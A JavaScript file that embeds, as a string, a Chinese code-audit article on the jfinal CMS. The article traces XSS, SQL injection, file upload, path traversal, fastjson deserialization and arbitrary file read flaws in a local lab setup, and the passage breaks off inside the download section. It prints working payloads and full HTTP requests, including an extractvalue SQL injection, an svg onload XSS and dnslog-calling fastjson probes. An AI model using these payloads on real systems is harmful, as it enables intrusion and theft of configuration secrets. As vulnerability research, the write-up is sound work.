const n=`# \u6587\u7AE0 - JAVA\u4EE3\u7801\u5BA1\u8BA1-jfinal  - \u5148\u77E5\u793E\u533A

Created: March 26, 2025 11:36 AM
URL: https://xz.aliyun.com/news/16406
\u6587\u7AE0\u4E8C\u7EA7\u7C7B\u522B: 0Day\u6316\u6398-\u6CE8\u610F\u56FE\u7247\u624B\u52A8\u62D6\u8FDB\u6765
\u6587\u7AE0\u7C7B\u522B(\u6839\u636EWebStorm\u7684\u76EE\u5F55\u6765): \u4EE3\u7801\u5BA1\u8BA1

# \u4E00\u3001jfinal cms \u7B80\u4ECB

jfinal cms\u662F\u4E00\u4E2Ajava\u5F00\u53D1\u7684\u529F\u80FD\u5F3A\u5927\u7684\u4FE1\u606F\u54A8\u8BE2\u7F51\u7AD9\uFF0C\u91C7\u7528\u4E86\u7B80\u6D01\u5F3A\u5927\u7684JFinal\u4F5C\u4E3Aweb\u6846\u67B6\uFF0C\u6A21\u677F\u5F15\u64CE\u7528\u7684\u662Fbeetl\uFF0C\u6570\u636E\u5E93\u7528mysql\uFF0C\u524D\u7AEFbootstrap\u6846\u67B6\u3002\u652F\u6301oauth2\u8BA4\u8BC1\u3001\u5E10\u53F7\u6CE8\u518C\u3001\u5BC6\u7801\u52A0\u5BC6\u3001\u8BC4\u8BBA\u53CA\u56DE\u590D\uFF0C\u6D88\u606F\u63D0\u793A\uFF0C\u7F51\u7AD9\u8BBF\u95EE\u91CF\u7EDF\u8BA1\uFF0C\u6587\u7AE0\u8BC4\u8BBA\u6570\u548C\u6D4F\u89C8\u91CF\u7EDF\u8BA1\uFF0C\u56DE\u590D\u7BA1\u7406\uFF0C\u652F\u6301\u6743\u9650\u7BA1\u7406\u3002\u540E\u53F0\u6A21\u5757\u5305\u542B\uFF1A\u680F\u76EE\u7BA1\u7406\uFF0C\u680F\u76EE\u516C\u544A\uFF0C\u680F\u76EE\u6EDA\u52A8\u56FE\u7247\uFF0C\u6587\u7AE0\u7BA1\u7406\uFF0C\u56DE\u590D\u7BA1\u7406\uFF0C\u610F\u89C1\u53CD\u9988\uFF0C\u6211\u7684\u76F8\u518C\uFF0C\u76F8\u518C\u7BA1\u7406\uFF0C\u56FE\u7247\u7BA1\u7406\uFF0C\u4E13\u8F91\u7BA1\u7406\u3001\u89C6\u9891\u7BA1\u7406\u3001\u7F13\u5B58\u66F4\u65B0\uFF0C\u53CB\u60C5\u94FE\u63A5\uFF0C\u8BBF\u95EE\u7EDF\u8BA1\uFF0C\u8054\u7CFB\u4EBA\u7BA1\u7406\uFF0C\u6A21\u677F\u7BA1\u7406\uFF0C\u7EC4\u7EC7\u673A\u6784\u7BA1\u7406\uFF0C\u7528\u6237\u7BA1\u7406\uFF0C\u89D2\u8272\u7BA1\u7406\uFF0C\u83DC\u5355\u7BA1\u7406\uFF0C\u6570\u636E\u5B57\u5178\u7BA1\u7406\u3002

# \u4E8C\u3001jfinal cms \u73AF\u5883\u642D\u5EFA

\u6E90\u7801\u4E0B\u8F7D\u5730\u5740 [https://github.com/jflyfox/jfinal_cms](https://github.com/jflyfox/jfinal_cms)
idea 2022
jdk1.8.0_112
apache-tomcat-9.0.68

\u7528idea \u6253\u5F00\u9879\u76EE\u540E \u81EA\u52A8\u4E0B\u8F7D\u4F9D\u8D56\u5305 \u8BBE\u7F6Etomcat

![](https://xzfile.aliyuncs.com/media/upload/picture/20241231113233-df79df8c-c727-1.png)

![](https://xzfile.aliyuncs.com/media/upload/picture/20241231113240-e35d7794-c727-1.png)

![](https://xzfile.aliyuncs.com/media/upload/picture/20241231113249-e9152826-c727-1.png)

\u4FEE\u6539src/main/webapp/static/component/filemanager/scripts/filemanager.config.js
\u7AEF\u53E3\u8BB0\u5F97\u52A0\u4E0A \u4E0D\u7136\u53EF\u80FD\u540E\u53F0\u8C03\u7528\u7F16\u8F91\u5668 \u6709\u53EF\u80FD\u4E0D\u73B0\u5B9E\u3002
"fileRoot": "/jfinal_cms/",
"baseUrl": "[http://127.0.0.1:8081/jfinal_cms/](http://127.0.0.1:8081/jfinal_cms/)",

![](https://xzfile.aliyuncs.com/media/upload/picture/20241231113302-f08352cc-c727-1.png)

\u65B0\u5EFA \u6570\u636E\u5E93 jflyfox_cms \u5BFC\u5165 SQL\u6587\u4EF6

![](https://xzfile.aliyuncs.com/media/upload/picture/20241231113310-f599a5f4-c727-1.png)

\u4FEE\u6539\u6570\u636E\u5E93\u4FE1\u606F

\`\`\`
db_type=mysql
mysql.jdbcUrl =jdbc:mysql://127.0.0.1:3306/jflyfox_cms?characterEncoding=UTF-8&zeroDateTimeBehavior=convertToNull&allowPublicKeyRetrieval=true&serverTimezone=UTC&useSSL=false
mysql.user = root
mysql.password = root
mysql.driverClass = com.mysql.cj.jdbc.Driver
\`\`\`

\u8BBE\u7F6Eredis src/main/resources/conf/cache.properties

\`\`\`
###################\\u5e8f\\u5217\\u5316\\u5de5\\u5177 java,fst
CACHE.SERIALIZER.DEFAULT=java
###################\\u7f13\\u5b58\\u5de5\\u5177 RedisCache,MemoryCache,MemorySerializeCache
CACHE.NAME=MemorySerializeCache
###################redis
redis.host=127.0.0.1
redis.port=6379
redis.maxIdel=300
redis.maxWait=300000
redis.poolTimeWait=300000
redis.password=
\`\`\`

![](https://xzfile.aliyuncs.com/media/upload/picture/20241231113402-148e7fac-c728-1.png)

phpstudy \u8BBE\u7F6Eredis

![](https://xzfile.aliyuncs.com/media/upload/picture/20241231113411-1964d3e6-c728-1.png)

\u70B9\u51FB\u8FD0\u884Ctomcat \u8BBF\u95EE [http://localhost:8081/jfinal_cms/home](http://localhost:8081/jfinal_cms/home)

![](https://xzfile.aliyuncs.com/media/upload/picture/20241231113419-1e236f64-c728-1.png)

\u8D26\u53F7\u548C\u5BC6\u7801
\u7BA1\u7406\u5458\u8D26\u53F7\u548C\u5BC6\u7801 admin admin123 \u666E\u901A\u7528\u6237 test 123456
[http://localhost:8081/jfinal_cms/admin](http://localhost:8081/jfinal_cms/admin) \u540E\u53F0

![](https://xzfile.aliyuncs.com/media/upload/picture/20241231113431-255a5fe0-c728-1.png)

# \u4E09\u3001\u4EE3\u7801\u5BA1\u8BA1

## 1 xss\u6F0F\u6D1E

\u8BE5\u7A0B\u5E8F\u9ED8\u8BA4\u662F\u4F7F\u7528 beetl\u6A21\u677F\u5F15\u5165 \u9ED8\u8BA4\u4E0D\u4F1A\u8FC7\u6EE4xss

\`\`\`
<dependency>
   <groupId>com.ibeetl</groupId>
   <artifactId>beetl</artifactId>
   <version>\${beetl.version}</version>
</dependency>
\u4FEE\u6539\u540D\u79F0 \u8F93\u5165 
m<svg/onload=alert(1)>
\`\`\`

![](https://xzfile.aliyuncs.com/media/upload/picture/20241231113451-318dccf2-c728-1.png)

\u8C03\u8BD5\u8DDF\u8E2A\u5206\u6790\u8BE5\u6F0F\u6D1E
src/main/java/com/jflyfox/modules/front/controller/PersonController.java

\`\`\`
public void save() {
        JSONObject json = new JSONObject();
        json.put("status", 2);// \u5931\u8D25
        SysUser user = (SysUser) getSessionUser();
        int userid = user.getInt("userid");
        SysUser model = getModel(SysUser.class);
        if (userid != model.getInt("userid")) {
            json.put("msg", "\u63D0\u4EA4\u6570\u636E\u9519\u8BEF\uFF01");
            renderJson(json.toJSONString());
            return;
        }
\`\`\`

\u4ECEsave\u63D0\u4EA4\u8FD9\u91CC\u4E0B\u4E00\u4E2A\u65AD\u70B9 \u8C03\u8BD5
getModel \u91CC\u9762

![](https://xzfile.aliyuncs.com/media/upload/picture/20241231113520-42b43804-c728-1.png)

![](https://xzfile.aliyuncs.com/media/upload/picture/20241231113528-475f11e4-c728-1.png)

request\u91CC\u5B58\u5728post\u4FE1\u606F

![](https://xzfile.aliyuncs.com/media/upload/picture/20241231113542-4ffbc6bc-c728-1.png)

\`\`\`
search_header=
model.userid=3
model.realname=m<svg/onload=alert(1)>
old_password=123456
new_password=
new_password2=
model.email=moon@moonsec.com
model.tel=
model.title_url=
model.remark=
\`\`\`

\u53EF\u4EE5\u770B\u5230\u5E76\u6CA1\u6709\u770B\u5230\u4EFB\u4F55\u8FC7\u6EE4\u3002
\u8DDF\u8E2Amodel.update()

![](https://xzfile.aliyuncs.com/media/upload/picture/20241231113553-565e1532-c728-1.png)

\u5BF9\u63D0\u4EA4\u7684\u5185\u5BB9\u8FDB\u884C\u8FDB\u884C\u66F4\u65B0 \u4F7F\u7528\u9884\u7F16\u8BD1\u5904\u7406

\`\`\`
protected int update(Config config, Connection conn, String sql, Object... paras) throws SQLException {
        PreparedStatement pst = conn.prepareStatement(sql);
        config.dialect.fillStatement(pst, paras);
        int result = pst.executeUpdate();
        DbKit.close(pst);
        return result;
    }
\`\`\`

![](https://xzfile.aliyuncs.com/media/upload/picture/20241231113605-5d9016fc-c728-1.png)

\u8FD4\u56DE\u7ED3\u679C\u5230\u6570\u636E\u67E5\u8BE2\u91CD\u65B0\u8D4B\u503C\u5230session\u4E2D

![](https://xzfile.aliyuncs.com/media/upload/picture/20241231113610-60bb8370-c728-1.png)

\u67E5\u770B\u6A21\u677F src/main/webapp/template/bbs/includes/userinfo.html

\`\`\`
<div class="col-md-9">
                        <strong>\${user.realname!''}</strong>
                        <p style="word-break: break-all;word-wrap: break-word;">\${user.remark!'\u8FD9\u4E2A\u5BB6\u4F19\u592A\u61D2\u4E86\uFF0C\u6682\u65E0\u8BF4\u660E'}</p>
                  </div>
                 </div>
\`\`\`

\${user.realname!''} \u76F4\u63A5\u8F93\u51FA \u5E76\u6CA1\u6709\u4EFB\u4F55\u8FC7\u6EE4\u3002

![](https://xzfile.aliyuncs.com/media/upload/picture/20241231113629-6c1a46a2-c728-1.png)

## 2\u3001SQL\u6CE8\u5165\u6F0F\u6D1E

\u6F0F\u6D1E\u4EE3\u7801
src/main/java/com/jflyfox/modules/admin/article/ArticleController.java

\`\`\`
public void list() {
        TbArticle model = getModelByAttr(TbArticle.class);
        SQLUtils sql = new SQLUtils(" from tb_article t " //
                + " left join tb_folder f on f.id = t.folder_id " //
                + " where 1 = 1 ");
        if (model.getAttrValues().length != 0) {
            sql.setAlias("t");
            sql.whereLike("title", model.getStr("title"));
            sql.whereEquals("folder_id", model.getInt("folder_id"));
            sql.whereEquals("status", model.getInt("status"));
        }
        // \u7AD9\u70B9\u8BBE\u7F6E
        int siteId = getSessionUser().getBackSiteId();
        sql.append(" and site_id = " + siteId);
        // \u6392\u5E8F
        String orderBy = getBaseForm().getOrderBy();
        if (StrUtils.isEmpty(orderBy)) {
            sql.append(" order by t.folder_id,t.sort,t.create_time desc ");
        } else {
            sql.append(" order by t.").append(orderBy);
        }
String orderBy = getBaseForm().getOrderBy(); \u662F\u83B7\u53D6\u8868\u5355\u63D0\u4EA4\u4FE1\u606F
    public BaseForm getBaseForm() {
        BaseForm form = super.getAttr("form");
        return form == null ? new BaseForm() : form;
    }
\`\`\`

\u521B\u5EFA\u8868\u5355\u4FE1\u606F
\u8868\u5355\u7C7B

\`\`\`
src/main/java/com/jflyfox/jfinal/base/BaseForm.java
public class BaseForm {
    private Paginator paginator;
    private String orderColumn;
    private String orderAsc;
    private boolean showCondition;
String orderBy = getBaseForm().getOrderBy(); \u83B7\u53D6\u8BBE\u7F6E\u5185\u5BB9
public String getOrderBy() {
        if (StrUtils.isEmpty(getOrderColumn())) {
            return "";
        }
        return " " + getOrderColumn() + " " + getOrderAsc() + " ";
    }
    public String getOrderColumn() {
        return orderColumn;
    }
    public void setOrderColumn(String orderColumn) {
        this.orderColumn = orderColumn;
    }
    public String getOrderAsc() {
        return orderAsc;
    }
\`\`\`

![](https://xzfile.aliyuncs.com/media/upload/picture/20241231113705-81519e12-c728-1.png)

![](https://xzfile.aliyuncs.com/media/upload/picture/20241231113711-84f09a64-c728-1.png)

\u6700\u7EC8\u5230 db.query\u51FD\u6570\u67E5\u8BE2

![](https://xzfile.aliyuncs.com/media/upload/picture/20241231113718-88e85a44-c728-1.png)

\u4F7F\u7528pst.executeQuery\u6267\u884C\u8BED\u53E5

![](https://xzfile.aliyuncs.com/media/upload/picture/20241231113725-8d040d62-c728-1.png)

\u6F0F\u6D1E\u9A8C\u8BC1

\`\`\`
POST /jfinal_cms/admin/article/list HTTP/1.1
Host: localhost:8081
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/111.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
Accept-Encoding: gzip, deflate
Content-Type: application/x-www-form-urlencoded
Content-Length: 187
Origin: http://localhost:8081
Connection: close
Referer: http://localhost:8081/jfinal_cms/admin/article/list
Cookie: JSESSIONID=9840D3331AC6D2F7D20C933EDA0019E3; Hm_lvt_42e5492fd27f48fc8becc94219516005=1678517471; _ga_WNLDH1S58P=GS1.1.1678517472.1.0.1678517484.0.0.0; _ga=GA1.1.1743648385.1678517472; JSESSIONID=562F0AE21BC68607AD6126E8AA34A181; __bid_n=1876a8763dc4f81b144207; Hm_lvt_1040d081eea13b44d84a4af639640d51=1681119471; Hm_lpvt_1040d081eea13b44d84a4af639640d51=1681218292; FPTOKEN=fqoa4yrp+3vQH1uCqgrxKfxDwT1VSVo9qf0vZYks/jAbimbZ/EYP1XqwH4zqW/in3QKiAVrolJvlkBwPJWz+wW+tAykYdxr3pLAHW7kQ/vMJXYpv066TzcDjiTIIC+xEpwCh6ip9yn3JFa08l/gyRoHk3IpwVKKtkM4+KcHT05JKRMaZQtS69O4GnmI4Je9/jy7nlxv0MGec2oJd3Is8Gz58XQ9bOkX1OPKfr6oAfOtvom/RvkyqH3W6FJUdjx11RV4S16VaaE5nHkqQwQ7iSROpnduKtthfmV2u5mwLcdRqb7OluPT9FHXDfRXXfYeTJxL49r3O8F6ONeNMF34jWVwnR3N2KhJYvYsEzCnbZyE0wPdwEOpI4d07yqKF6jQKN0HesvwTKDLa1rUmu3Q4iQ==|THzAa+GHoQO9etvj1QyeF1WBKyWoxjd7m8RnifJgrRM=|10|6490fbbe388be28313c4abd3696bcc8a; session_user=wgPmpe3hEuJWIL+I+kHtxqag1wutWsMhm6eaAgoJH0c=
Upgrade-Insecure-Requests: 1
Sec-Fetch-Dest: document
Sec-Fetch-Mode: navigate
Sec-Fetch-Site: same-origin
Sec-Fetch-User: ?1
form.orderColumn=%2b+0 and (extractvalue(1,concat(0x7e,(select user()),0x7e)))%23&form.orderAsc=&attr.folder_id=256&attr.title=&attr.status=1&totalRecords=1&pageNo=1&pageSize=20&length=10
\`\`\`

\u6240\u6709\u8C03\u7528 getBaseForm().getOrderBy();\u5747\u5B58\u5728\u6CE8\u5165

![](https://xzfile.aliyuncs.com/media/upload/picture/20241231113738-95433174-c728-1.png)

![](https://xzfile.aliyuncs.com/media/upload/picture/20241231113749-9b774cb0-c728-1.png)

## 3\u3001\u4EFB\u610F\u6587\u4EF6\u4E0A\u4F20\u6F0F\u6D1E

\u5728\u7F51\u7AD9\u540E\u53F0 \u8BBF\u95EE\u6A21\u677F\u7BA1\u7406 \u9009\u62E9\u6587\u4EF6\u4E0A\u4F20 \u56FE\u7247\u6587\u4EF6 \u4E0A\u4F20\u540E \u4F7F\u7528burpsuite\u6293\u5305\u6539\u5305

![](https://xzfile.aliyuncs.com/media/upload/picture/20241231113756-9f9dbb26-c728-1.png)

\u8C03\u8BD5\u8DDF\u8E2A
com/jflyfox/modules/filemanager/FileManagerController.java
\u8FDB\u5165 fm.add

![](https://xzfile.aliyuncs.com/media/upload/picture/20241231113803-a431369a-c728-1.png)

\u521B\u5EFA\u7F13\u5B58\u76EE\u5F55

![](https://xzfile.aliyuncs.com/media/upload/picture/20241231113810-a825d904-c728-1.png)

\u521B\u5EFA\u6587\u4EF6 \u53EF\u4EE5\u770B\u5230jsp\u6587\u4EF6\u5E76\u6CA1\u6709\u4EFB\u4F55\u8FC7\u6EE4\u3002

![](https://xzfile.aliyuncs.com/media/upload/picture/20241231113817-ac55250c-c728-1.png)

renameto \u628A\u7F13\u5B58\u6587\u4EF6\u79FB\u52A8\u5230\u65B0\u6587\u4EF6\u5185

![](https://xzfile.aliyuncs.com/media/upload/picture/20241231113825-b0e3fe9a-c728-1.png)

\u5728\u67E5\u770Btomcat\u76EE\u5F55

![](https://xzfile.aliyuncs.com/media/upload/picture/20241231113831-b47eb8f6-c728-1.png)

\u53EF\u4EE5\u770B\u5230cmd.jsp\u5DF2\u7ECF\u4E0A\u4F20\u5230tomcat\u4E2D\u3002\u4F46\u662F\u8BBF\u95EE\u4F1A\u5931\u8D25\u3002

![](https://xzfile.aliyuncs.com/media/upload/picture/20241231113837-b83456d6-c728-1.png)

\u8BBF\u95EE\u5931\u8D25\u7684\u539F\u56E0\u662F \u5728\u8FD9\u4E2A\u7A0B\u5E8F\u4E2D web.xml

\`\`\`
<display-name>jflyfox</display-name>
    <welcome-file-list>
        <welcome-file>login.jsp</welcome-file>
    </welcome-file-list>
    <filter>
        <filter-name>jfinal</filter-name>
        <filter-class>com.jfinal.core.JFinalFilter</filter-class>
        <init-param>
            <param-name>configClass</param-name>
            <param-value>com.jflyfox.component.config.BaseConfig</param-value>
        </init-param>
    </filter>
\`\`\`

\u8FDB\u5165JFinalFilter

\`\`\`
if (isHandled[0] == false) {
            // \u9ED8\u8BA4\u62D2\u7EDD\u76F4\u63A5\u8BBF\u95EE jsp \u6587\u4EF6\uFF0C\u52A0\u56FA tomcat\u3001jetty \u5B89\u5168\u6027
            if (constants.getDenyAccessJsp() && isJsp(target)) {
                com.jfinal.kit.HandlerKit.renderError404(request, response, isHandled);
                return ;
            }
\`\`\`

\u8DDF\u8E2A isJsp

\`\`\`
boolean isJsp(String t) {
        char c;
        int end = t.length() - 1;
        if ( (end > 3) && ((c = t.charAt(end)) == 'x' || c == 'X') ) {
            end--;
        }
        if ( (end > 2) && ((c = t.charAt(end)) == 'p' || c == 'P') ) {
            end--;
            if ( (end > 1) && ((c = t.charAt(end)) == 's' || c == 'S') ) {
                end--;
                if ( (end > 0) && ((c = t.charAt(end)) == 'j' || c == 'J') ) {
                    end--;
                    if ( (end > -1) && ((c = t.charAt(end)) == '.') ) {
                        return true;
                    }
                }
            }
        }
\`\`\`

\u5982\u679C\u662Fjsp\u548Cjspx\u90FD\u8FD4\u56DE404 \u9875\u9762

![](https://xzfile.aliyuncs.com/media/upload/picture/20241231113905-c8dd51b8-c728-1.png)

## 4\u3001 \u76EE\u5F55\u7A7F\u8D8A\u6F0F\u6D1E

\u5728\u4E0A\u4F20\u6F0F\u6D1E\u54EA\u91CC\u53D1\u73B0\u4E00\u4E2A\u53EF\u63A7\u53D8\u91CF

\`\`\`
try {
                        currentPath = params.get("currentpath");
                        respPath = currentPath;
                        currentPath = new String(currentPath.getBytes("ISO8859-1"), "UTF-8"); // \u4E2D\u6587\u8F6C\u7801
                        currentPath = getFilePath(currentPath);
                    } catch (UnsupportedEncodingException e) {
                        e.printStackTrace();
                    }
\`\`\`

\u5728\u4E0A\u4F20\u6587\u4EF6\u7684\u65F6\u5019 \u5B58\u5728\u76EE\u5F55\u7A7F\u8D8A\u6F0F\u6D1E\u3002

![](https://xzfile.aliyuncs.com/media/upload/picture/20241231113923-d3e50772-c728-1.png)

## 5\u3001 fastjson \u524D\u53F0\u53CD\u5E8F\u5217\u5316\u6F0F\u6D1E

\u5728pomx.xml\u53D1\u73B0 fastjson \u7248\u672C\u662F

\`\`\`
<fastjson.version>1.2.62</fastjson.version>
        <dependency>
            <groupId>com.alibaba</groupId>
            <artifactId>fastjson</artifactId>
            <version>\${fastjson.version}</version>
        </dependency>
\`\`\`

\u641C\u7D22\u9879\u76EE JSON.parse

![](https://xzfile.aliyuncs.com/media/upload/picture/20241231113935-db06ebb0-c728-1.png)

![](https://xzfile.aliyuncs.com/media/upload/picture/20241231113948-e2c867b6-c728-1.png)

\u5148\u627E\u524D\u53F0\u7684

\`\`\`
src/main/java/com/jflyfox/api/form/ApiForm.java
    private JSONObject getParams() {
        JSONObject json = null;
        try {
            String params = "";
            params = this.p;
            boolean flag = ConfigCache.getValueToBoolean("API.PARAM.ENCRYPT");
            if (flag) {
                params = ApiUtils.decode(params);
            }
            json = JSON.parseObject(params);
        } catch (Exception e) {
            log.error("apiform json parse fail:" + p);
            return new JSONObject();
        }
\`\`\`

\u56DE\u6EAF\u5B9A\u4F4D\u8C03\u7528\u70B9

![](https://xzfile.aliyuncs.com/media/upload/picture/20241231114005-ecb44d6c-c728-1.png)

\u67E5\u770BApiForm\u88AB ApiController \u8C03\u7528

![](https://xzfile.aliyuncs.com/media/upload/picture/20241231114012-f08b04b2-c728-1.png)

\u67E5\u770Bapi \u6587\u6863\u521A\u597D\u6709 \u9A8C\u8BC1\u767B\u5F55
/api/action/login?version=1.0.1&apiNo=1000000&time=20170314160401&p={username:"admin",password:"123"}
\u628Ap=\u540E\u9762\u7684\u6362\u6210
{"@type":"java.net.Inet4Address","val":"xxx.cnkfv6.dnslog.cn"}

![](https://xzfile.aliyuncs.com/media/upload/picture/20241231114051-07dab608-c729-1.png)

\u6F0F\u6D1E\u9A8C\u8BC1

\`\`\`
POST /jfinal_cms/api/action/login?version=1.0.1&apiNo=1000000&time=20170314160401 HTTP/1.1
Host: localhost:8081
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/111.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
Accept-Encoding: gzip, deflate
Connection: close
Cookie: JSESSIONID=E75DFFA0E71ED1AFDD083FD433B2F909; Hm_lvt_42e5492fd27f48fc8becc94219516005=1678517471; _ga_WNLDH1S58P=GS1.1.1678517472.1.0.1678517484.0.0.0; _ga=GA1.1.1743648385.1678517472; JSESSIONID=562F0AE21BC68607AD6126E8AA34A181; __bid_n=1876a8763dc4f81b144207; Hm_lvt_1040d081eea13b44d84a4af639640d51=1681119471; Hm_lpvt_1040d081eea13b44d84a4af639640d51=1681234539; FPTOKEN=CBYwY1vqboLVYjyDBqLlG6mLeS2dp0pfN+q78Dahs8zM1hQU2X8EUH0vILRgbn5C5a2G9rJOFQnpwtT+WKRF1ZweRsDFtkEc+i5KZI9DyVZpwV2Elnfrlh3ALJloXfEVtPtpJM6hhuzHlK4NY9J+jsZrMot2o5vOc6dSiKPacVyNFzIz+vvto3NgvXd/dtOXEr7cgjeul0qJM02VGtpmVtckCuIdB3Rmz/s2cj84LBRhLpP4WkiFTrdaE23Grdu84DwcziDuOWk+4iDehqlRZZQYYPghRzuGCxPeO/19d34T35r/Cok028cVe4sKLxtGvw/oUdzPKCzFABTtTk4HBt/QRviZS45E+TKD8DUgAYOd12SezamFFBLh6tW1kPshshu5hqwDFz5ZuyKakyt61A==|3uAMcHU7rpdn+Lq3u6Oy9wzSKQK2ztvNVV5V2pM18R4=|10|06b25955e8fbbbd80dff787def184fbd; session_user=wgPmpe3hEuJWIL+I+kHtxqag1wutWsMhm6eaAgoJH0c=
Upgrade-Insecure-Requests: 1
Sec-Fetch-Dest: document
Sec-Fetch-Mode: navigate
Sec-Fetch-Site: none
Sec-Fetch-User: ?1
Content-Type: application/x-www-form-urlencoded
Content-Length: 64
\`\`\`

p={"@type":"java.net.Inet4Address","val":"xxx.qjfws9.dnslog.cn"}
dnslog\u8FD4\u56DE\u503C

![](https://xzfile.aliyuncs.com/media/upload/picture/20241231114102-0e84f6a8-c729-1.png)

## 6\u3001 fastjson \u540E\u53F0\u53CD\u5E8F\u5217\u5316\u6F0F\u6D1E

\u6F0F\u6D1E\u4EE3\u7801 src/main/java/com/baidu/ueditor/ConfigManager.java

\`\`\`
private void initEnv() throws FileNotFoundException, IOException {
        File file = new File(this.originalPath);
        if (!file.isAbsolute()) {
            file = new File(file.getAbsolutePath());
        }
        this.parentPath = file.getParent();
        String configContent = this.readFile(this.getConfigPath());
        try {
            JSONObject jsonConfig = JSONObject.parseObject(configContent);
            this.jsonConfig = jsonConfig;
        } catch (Exception e) {
            this.jsonConfig = null;
        }
    }
\`\`\`

JSONObject \u662F\u7EE7\u627F \u6240\u4EE5\u4E5F\u662F\u5B58\u5728 JSON

\`\`\`
public class JSONObject extends JSON implements Map<String, Object>, Cloneable, Serializable, InvocationHandler {
    private static final long serialVersionUID = 1L;
    private static final int DEFAULT_INITIAL_CAPACITY = 16;
    private final Map<String, Object> map;
    public JSONObject() {
        this(16, false);
    }
\`\`\`

src/main/java/com/jflyfox/component/controller/Ueditor.java

![](https://xzfile.aliyuncs.com/media/upload/picture/20241231114122-1a44d7c4-c729-1.png)

\u8BBF\u95EE \u8DDF\u8FDB ActionEnter

![](https://xzfile.aliyuncs.com/media/upload/picture/20241231114127-1dce4b0a-c729-1.png)

\u8C03\u7528ConfigManager

![](https://xzfile.aliyuncs.com/media/upload/picture/20241231114134-216f0f92-c729-1.png)

\u7EE7\u7EED\u8DDF\u8FDB this.iniEnv \u8C03\u7528\u5230 JSONObject.parseObject

![](https://xzfile.aliyuncs.com/media/upload/picture/20241231114148-2a2b25d0-c729-1.png)

\u4F20\u5165\u7684json\u6587\u4EF6\u662F\u901A\u8FC7\u8BFB\u53D6\u6587\u4EF6config.json
src\\main\\java\\com\\baidu\\ueditor\\ConfigManager.java
private static final String configFileName = "config.json";

![](https://xzfile.aliyuncs.com/media/upload/picture/20241231114159-3056e250-c729-1.png)

\u8BFB\u53D6\u6587\u4EF6

\`\`\`
private String getConfigPath() {
        return this.parentPath + File.separator //
                + "WEB-INF" + File.separator + "classes" + File.separator + ConfigManager.configFileName;
    }
\`\`\`

\u767B\u5F55\u540E\u53F0
\u4E0A\u4F20 \u66FF\u6362

![](https://xzfile.aliyuncs.com/media/upload/picture/20241231114210-3767dd88-c729-1.png)

config.json
{"@type":"java.net.Inet4Address","val":".dnslog.cn"}

![](https://xzfile.aliyuncs.com/media/upload/picture/20241231114218-3bf8658e-c729-1.png)

\u8BBF\u95EE [http://localhost:8081/jfinal_cms/ueditor](http://localhost:8081/jfinal_cms/ueditor) \u89E6\u53D1

![](https://xzfile.aliyuncs.com/media/upload/picture/20241231114224-3f6cd9f2-c729-1.png)

dnslog\u8FD4\u56DE\u4FE1\u606F

![](https://xzfile.aliyuncs.com/media/upload/picture/20241231114228-41f4141a-c729-1.png)

## 7\u3001 \u4EFB\u610F\u6587\u4EF6\u8BFB\u53D6\u6F0F\u6D1E

\u6F0F\u6D1E\u4EE3\u7801
src/main/java/com/jflyfox/modules/filemanager/FileManager.java

![](https://xzfile.aliyuncs.com/media/upload/picture/20241231114234-45b3b16e-c729-1.png)

\`\`\`
public JSONObject editFile() {
        JSONObject array = new JSONObject();
        // \u8BFB\u53D6\u6587\u4EF6\u4FE1\u606F
        try {
            String content = FileManagerUtils.readString(getRealFilePath());
            content = FileManagerUtils.encodeContent(content);
            array.put("Path", this.get.get("path"));
            array.put("Content", content);
            array.put("Error", "");
            array.put("Code", 0);
\`\`\`

\u8DDF\u8FDB FileManagerUtils.readString

![](https://xzfile.aliyuncs.com/media/upload/picture/20241231114248-4e0c8f98-c729-1.png)

\u8BFB\u53D6\u6587\u4EF6\u914D\u7F6E\u6587\u4EF6 /web-inf/classes/conf/db.properties

\`\`\`
GET /jfinal_cms/admin/filemanager?mode=editfile&path=/web-inf/classes/conf/db.properties&config=filemanager.config.js&time=855 HTTP/1.1
Host: localhost:8081
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:133.0) Gecko/20100101 Firefox/133.0
Accept: image/avif,image/webp,image/png,image/svg+xml,image/*;q=0.8,*/*;q=0.5
Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
Accept-Encoding: gzip, deflate, br
Connection: keep-alive
Referer: http://localhost:8081/jfinal_cms/admin/filemanager/list
Cookie: JSESSIONID=09A7ABEF006CACF62B15C3D8761B82C4; Hm_lvt_1040d081eea13b44d84a4af639640d51=1735440936; Hm_lpvt_1040d081eea13b44d84a4af639640d51=1735457812; HMACCOUNT=66F24227D241D541; session_user=wgPmpe3hEuJWIL+I+kHtxqag1wutWsMhm6eaAgoJH0c=
Sec-Fetch-Dest: image
Sec-Fetch-Mode: no-cors
Sec-Fetch-Site: same-origin
Priority: u=5, i
\`\`\`

![](https://xzfile.aliyuncs.com/media/upload/picture/20241231114301-55702056-c729-1.png)

## 8\u3001 \u4EFB\u610F\u6587\u4EF6\u4E0B\u8F7D\u6F0F\u6D1E

\u8FD9\u4E2A\u6F0F\u6D1E\u8DDF\u4EFB\u610F\u6587\u4EF6\u8BFB\u53D6\u6F0F\u6D1E\u7C7B\u4F3C \u4E5F\u662F\u5BF9\u4F20\u5165\u7684\u8DEF\u5F84\u6CA1\u6709\u8FDB\u884C\u8FC7\u6EE4
\u6F0F\u6D1E\u4EE3\u7801

\`\`\`
src/main/java/com/jflyfox/modules/filemanager/FileManagerController.java
        } else if (mode.equals("download")) {
                        if (needPath) {
                            fm.download(getResponse());
}
\`\`\`

\u8C03\u7528downlowd

\`\`\`
public void download(HttpServletResponse resp) {
        File file = new File(getRealFilePath());
        if (this.get.get("path") != null && file.exists()) {
            resp.setHeader("Content-type", "application/force-download");
            resp.setHeader("Content-Disposition", "inline;filename=\\"" + fileRoot + this.get.get("path") + "\\"");
            resp.setHeader("Content-Transfer-Encoding", "Binary");
            resp.setHeader("Content-length", "" + file.length());
            resp.setHeader("Content-Type", "application/octet-stream");
            resp.setHeader("Content-Disposition", "attachment; filename=\\"" + file.getName() + "\\"");
